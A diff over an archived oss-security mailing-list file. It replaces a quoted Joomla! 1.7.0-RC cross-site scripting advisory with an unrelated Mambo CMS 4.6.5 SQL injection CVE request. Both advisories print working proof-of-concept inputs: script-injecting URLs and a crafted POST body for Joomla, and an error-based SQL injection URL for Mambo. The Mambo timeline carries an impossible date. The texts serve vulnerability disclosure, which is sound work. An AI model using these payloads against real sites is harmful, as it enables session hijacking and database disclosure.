@@ -1,197 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/07/22/5
-Message-ID: <1055438330.1534758.1311364919942.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Fri, 22 Jul 2011 16:01:59 -0400 (EDT)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/08/11/10
+Message-ID: <CAPYM6VyyQBoAbPM8iB1bzH94U8Vosmy7GxcSbkCDuLCW-67fmw@mail.gmail.com>
+Date: Fri, 12 Aug 2011 04:45:57 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Cc: coley <coley@...re.org>
-Subject: Re: CVE Request: Joomla! 1.7.0-RC and lower | Cross Site Scripting Vulnerabilities
+Subject: CVE Request: Mambo CMS 4.6.x (4.6.5) | SQL Injection
 Content-Type: text/plain; charset=utf-8
 
-Please use CVE-2011-2710
-
-Thanks.
-
--- 
-    JB
+Mambo CMS 4.6.x (4.6.5) | SQL Injection
 
 
------ Original Message -----
-> =================================================================================
-> Joomla! 1.7.0-RC and lower | Multiple Cross Site Scripting (XSS)
-> Vulnerabilities
-> =================================================================================
-> 
-> 
-> 1. OVERVIEW
-> 
-> Joomla! 1.7.0-RC and versions of 1.6.x are vulnerable to multiple
-> Cross Site Scripting issues.
-> 
-> 
-> 2. BACKGROUND
-> 
-> Joomla is a free and open source content management system (CMS) for
-> publishing content on the World Wide Web and intranets. It comprises a
-> model–view–controller (MVC) Web application framework that can also be
-> used independently.
-> Joomla is written in PHP, uses object-oriented programming (OOP)
-> techniques and software design patterns, stores data in a MySQL
-> database, and includes features such as page caching, RSS feeds,
-> printable versions of pages, news flashes, blogs, polls, search, and
-> support for language internationalization.
-> 
-> 
-> 3. VULNERABILITY DESCRIPTION
-> 
-> Several parameters (searchword, Request URI) in Joomla! Core
-> components are not properly sanitized upon submission to the
-> /index.php url, which allows attacker to conduct Cross Site Scripting
-> attack. This may allow an attacker to create a specially crafted URL
-> that would execute arbitrary script code in a victim's browser.
-> 
-> 
-> 4. VERSION AFFECTED
-> 
-> 1.7.0-RC and all versions of 1.6.x
-> 
-> 
-> 5. PROOF-OF-CONCEPT/EXPLOIT
-> 
-> 
-> component: com_search, parameter: searchword (Browser: IE, Konqueror)
-> =====================================================================
-> N.B. Our previous reported issue (1.6.3) of "searchword" parameter XSS
-> was not fixed completely.
-> 
-> 
-> [REQUEST]
-> POST /joomla164_noseo/index.php HTTP/1.1
-> Host: localhost
-> Accept: */*
-> Accept-Language: en
-> User-Agent: MSIE 8.0
-> Connection: close
-> Referer: http://localhost/joomla164_noseo/
-> Content-Type: application/x-www-form-urlencoded
-> Content-Length: 456
-> 
-> 
-> task=search&Itemid=435&searchword=Search';onunload=function(){x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,111,32,116,111,32,73,110,98,111,120,63));alert(String.fromCharCode(89,111,117,39,118,101,32,103,111,116,32,88,83,83,33));};//xsssssssssss&option=com_search
-> [/REQUEST]
-> 
-> 
-> XSS in Request URI
-> ====================
-> File: ./includes/application.php
-> Line: 176, 181
-> Code: $document->setBase(JURI::current()); // instead of
-> $document->setBase(htmlspecialchars(JURI::current()));
-> 
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/new-feed-categories/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-category-list/24-joomla'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/search-component/search/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/site-map/contacts/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/component/banners/click/3'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/fruit-encyclopedia/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/fruit-encyclopedia/38-a'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/fruit-encyclopedia/39-b'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/fruit-encyclopedia/57-t'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/growers/23-happy-orange-orchard'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/image-gallery/animals/25-koala'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/image-gallery/scenery/64-blue-mountain-rain-forest'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/image-gallery/scenery/65-ormiston-pound'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/34-park-site/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/34-park-site/2-webmaster'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/35-shop-site/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/contact-component/contact-categories/35-shop-site/8-shop-address'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/archived-articles/9-uncategorised'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/archived-articles/9-uncategorised/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/archived-articles/9-uncategorised/67-whats-new-in-15'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-categories/26-park-site'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-categories/29-fruit-shop-site'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-category-list/20-extensions'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/content-component/article-category-list/24-joomla'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/1-joomla-announcements'"><script>alert(/XSS/)</script>
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/2-new-joomla-extensions'"><script>alert(/XSS/)</script>
-> 
-> 
-> http://localhost/joomla164/index.php/using-joomla/extensions/components/news-feeds-component/news-feed-category/3-joomla-security-news'"><script>alert(/XSS/)</script>
-> 
-> ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-> 
-> 
-> 6. IMPACT
-> 
-> Attackers can compromise currently logged-in user/administrator
-> session and impersonate arbitrary user actions available under
-> /administrator/ functions.
-> 
-> 
-> 7. SOLUTION
-> 
-> The development of Joomla! 1.6.x has been ceased; there will be no
-> fixed version for 1.6.x.
-> Upgrade to Joomla! 1.7.0-stable or higher.
-> 
-> 
-> 8. VENDOR
-> 
-> Joomla! Developer Team
-> http://www.joomla.org
-> 
-> 
-> 9. CREDIT
-> 
-> This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-> Ethical Hacker Group, Myanmar.
-> 
-> 
-> 10. DISCLOSURE TIME-LINE
-> 
-> 2011-07-02: notified vendor
-> 2011-07-19: patched version, 1.7.0-stable, released
-> 2011-07-22: vulnerability disclosed
-> 
-> 
-> 11. REFERENCES
-> 
-> Original Advisory URL:
-> http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.7.0-rc]_cross_site_scripting(XSS)
-> Previous Advisory URL:
-> http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
-> http://yehg.net/lab/#advisories.joomla
-> Vendor Advisory URL:
-> http://developer.joomla.org/security/news/357-20110701-xss-vulnerability.html
-> 
-> #yehg [2011-07-22]
+1. OVERVIEW
+
+Mambo CMS 4.6.5 and lower versions are vulnerable to SQL Injection.
+
+
+2. BACKGROUND
+
+Mambo is a full-featured, award-winning content management system that can
+be used for everything from simple websites to complex corporate
+applications. It is used all over the world to power government portals,
+corporate intranets and extranets, ecommerce sites, nonprofit outreach,
+schools, church, and community sites. Mambo's "power in simplicity" also
+makes it the CMS of choice for many small businesses and personal sites.
+
+
+3. VULNERABILITY DESCRIPTION
+
+The "zorder" parameter was not properly sanitized upon submission to the
+administrator/index2.php url, which allows attacker to conduct  SQL
+Injection attack. This could an attacker to inject or manipulate SQL queries
+in the back-end database, allowing for the manipulation or disclosure of
+arbitrary data.
+
+
+4. VERSIONS AFFECTED
+
+Tested on Mambo CMS 4.6.5
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+http://localhost/mambo/administrator/index2.php?limit=10&order[]=11&boxchecked=0&toggle=on&search=sqli&task=&limitstart=0&cid[]=on&zorder=-1OR
+(SELECT 9999 FROM(SELECT
+COUNT(*),CONCAT(CHAR(58,98,112,101,58),(SELECT
+(CASE WHEN (9999=9999) THEN 1 ELSE 0
+END)),CHAR(58,110,100,107,58),FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY
+x)a)&filter_authorid=62&hidemainmenu=0&option=com_typedcontent
+
+
+6. SOLUTION
+
+The vendor seems to discontinue the development. It is recommended to use
+another CMS in active development.
+
+
+7. VENDOR
+
+Mambo CMS Development Team
+http://mambo-developer.org
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2010-11-31: notified vendor through bug tracker
+2011-08-12: no patched version released up to date
+2011-08-12: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[mambo4.6_x]_sql_injection
+Mambo CMS:
+http://mambo-code.org/gf/download/frsrelease/388/791/MamboV4.6.5.zip
+
+
+#yehg [2011-08-12]
+
